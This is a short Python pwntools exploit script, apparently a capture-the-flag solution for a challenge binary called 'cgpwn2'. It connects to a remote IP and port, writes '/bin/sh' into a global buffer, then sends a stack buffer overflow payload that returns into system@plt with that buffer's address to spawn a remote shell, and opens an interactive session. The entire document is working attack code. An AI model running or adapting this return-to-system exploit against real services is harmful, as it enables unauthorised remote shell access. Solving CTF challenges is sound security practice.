from pwn import *
# p = process('./cgpwn2')
p = remote("111.200.241.244", "58199")

bin_sh_addr = 0x0804A080
'''
pwndbg> p &name
$3 = (<data variable, no debug info> *) 0x804a080 <name>
'''

p.recvuntil('\n')
p.sendline('/bin/sh')

p.recvuntil('\n')
system_addr = 0x08048420	
# 0x0804855a <+13>:	call   0x8048420 <system@plt> ; pwn functions

payload = 'A' * 42 + p32(system_addr) + p32(1) + p32(bin_sh_addr)
p.sendline(payload)

p.interactive()
